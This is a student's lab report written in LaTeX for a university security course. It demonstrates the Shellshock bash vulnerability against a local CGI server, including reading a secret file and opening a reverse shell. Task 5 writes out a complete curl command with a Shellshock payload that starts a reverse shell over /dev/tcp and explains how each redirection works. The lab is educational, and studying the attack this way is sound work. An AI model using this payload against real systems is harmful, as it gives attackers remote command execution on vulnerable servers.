@@ -1,0 +1,113 @@
+\documentclass[11pt]{article}
+
+\usepackage[margin=1in]{geometry}
+\usepackage{graphicx}
+\usepackage{fancyvrb}
+
+\newcommand{\fig}[2]{ 
+\begin{figure}[h]
+	\centering
+	\caption{#2}
+	\includegraphics[width=.75\textwidth]{pics/#1}
+	\label{fig:#1}
+\end{figure} 
+}
+
+\begin{document}
+
+\title{CSCI 476: Lab 02}
+\author{Nathan Stouffer}
+\maketitle
+\newpage
+
+\section*{Task 1}
+
+In task 1, we test the vulnerability of two shells: /bin/bash\_shellshock and /bin/bash. Specifically, we test vulnerability to the shellshock attack. The shellshock attack happens when an environment variable that declares a shell function has some trailing commands. There can be any number of these trailing commands, and if the shell does not interpret them correctly, then they will be run as regular commands. This lab demonstrates one way in which this could be used by an attacker.
+
+Figure \ref{fig:task1.1} shows how /bin/bash\_shellshock is vulnerable. Notice how the trailing command in the environment variable `testing' is immediately ran as a command when the child process /bin/bash\_shellshock is called. Figure \ref{fig:task1.2} shows how /bin/bash does not have this same vulnerability.
+
+\fig{task1.1}{Vulnerability in /bin/bash\_shellshock}
+
+\fig{task1.2}{Patched version /bin/bash}
+
+\newpage
+
+\section*{Task 2}
+
+Task 2 shows how cgi programs can be ran over servers. Figure \ref{fig:task2} first shows the contents of the file unpatched.cgi and then shows the file being called over a server.
+
+\fig{task2}{Functionality of CGI programs over servers}
+
+\newpage
+
+\section*{Task 3}
+
+Task 3 shows how environment variables can be passed from a client to the server. In this example (and for the remainder of this report), the client and the server are the same computer. However, all communication happens over a network.
+Figure \ref{fig:task3.1} shows the updated contents of unpatched.cgi and a server call with the parameter -A ``stuff." Figure \ref{fig:task3.2} shows the server environment variable HTTP\_USER\_AGENT=stuff. This shows that we can send arbitrary environment variables to the server.
+
+\fig{task3.1}{Contents of unpatched.cgi}
+
+\fig{task3.2}{Sending environment variables to the server}
+
+\newpage
+
+\section*{Task 4}
+
+Task 4 utilizes the vulnerability found in Task 1. If the server is running /bin/bash\_shellshock instead of /bin/bash, then we can use the shellshock attack. Figure \ref{fig:task4.1} first shows the contents of a file  called `secrets' in the cgi-bin/ directory. The next line uses the shellshock attack to print the contents of `secrets' to the console. Also note that unpatched.cgi no longer prints the environment variables to the screen.
+
+\fig{task4.1}{Hard coded command}
+
+If an attacker attempted to steal the contents of the `etc/shadow' file, they would only have luck. This inability is shown in Figure \ref{fig:task4.2}. This is because they are given web access privilges while accessing `etc/shadow' requires root privileges.
+
+\fig{task4.2}{No access to etc/shadow}
+
+\newpage
+
+\section*{Task 5}
+
+The results of Task 4 are only useful if an attacker knows exactly how the file architecture is set up on the server site. Task 5 shows a much more powerful attack. If we set up an environment variable that declares a function, then any child processes of the server will declare that function. When using a vulnerable version of bash, we can insert any set of commands we want at the end of the variable. Figure \ref{fig:task5.1} shows the commands for setting up a reverse shell. The top window is where we will receive the shell and the bottom window requests the information from the server.
+
+Let's now discuss how the command to start a reverse shell works. The command is typed below here for clarity (note that this should be typed as one line when running).
+
+\begin{Verbatim}
+curl -A "() { echo; }; echo Content-type: text/plain; echo; echo; 
+/bin/bash -i > /dev/tcp/localhost/9090 0<\&1 2>\&1" http://localhost/cgi-bin/unpatched.cgi
+\end{Verbatim}
+
+Let's start with the basics. The curl command tells the shell to run a network request and the url at the end tells the shell where to go. Now lets view the environment variable passed into the network request (remember, this value populates HTTP\_USER\_AGENT). We first tell the shell what type information to look for (echo Content-type ...). The interesting stuff starts with /bin/bash. This command tells the server to run a bash shell.
+
+In addition to running the shell, there are a number of arguments passed in. The first is `-i,' this tells the server that the shell should be interactive. Then there are three redirect actions.
+
+\begin{enumerate}
+	\item $>$ /dev/tcp/localhost/9090: This redirects the output of the bash shell to port 9090. Remember, we set up a shell to listen there for this very purpose.
+	\item 0$<$\&1: 0 is what receives input from the user. By this command, we are telling the shell to receive input from wherever 1 is pointing at. Because 1 points to output, the previous command sets up 1 to print to port 9090. This means 0 receives input from port 9090 as well.
+	\item 2$>$\&1: 2 points to standard error. This command tells standard error to go wherever standard out goes. As discussed before, this is to port 9090.
+\end{enumerate}
+
+\fig{task5.1}{Setting up reverse shell}
+
+Figures \ref{fig:task5.2} and \ref{fig:task5.3} show the reverse shell in action. As a web user. I was able to open a shell and use /bin/cat to read the secret file created for Task 4. This shows how vulnerable the shellshock attack is. I had full a full on shell that I could run on the server just as a regular web user. It is important to note that I did not have root access (shown with the whoami command), but it is a lot of power nonetheless.
+
+\fig{task5.2}{Running reverse shell}
+
+\fig{task5.3}{Reading secret file}
+
+\newpage
+
+\section*{Task 6}
+
+Task 6 repeats the steps from Task 3 and Task 5 but with the patched version of bash. Figure \ref{fig:task6.1} shows the contents of patched.cgi. Note that the shell used is /bin/bash instead of /bin/bash\_shellshock. Figure \ref{fig:task6.2} repeats Task 3, showing that we can send environment variables to the server from the client.
+
+\fig{task6.1}{Contents of patched.cgi}
+
+\fig{task6.2}{Sending environment variables to server}
+
+Now we repeat Task 5. Figure \ref{fig:task6.3} shows the necessary commands to set up the reverse shell. Again, the only difference between this and Task 5 is the shell used by the server. When this command runs, no reverse shell is created. Instead, patched.cgi runs as expected and prints the environment variables. This can be seen in Figure \ref{fig:task6.4}.
+
+\fig{task6.3}{Setting up reverse shell}
+
+\fig{task6.4}{Runs as expected, with no reverse shell}
+\newpage
+This concludes lab 02. I can see how shellshock was such a devastating attack. Any server that ran bash would be vulnerable to it and it hardly takes any time to set up from an attacker's perspective. This makes it especially dangerous.
+
+\end{document}
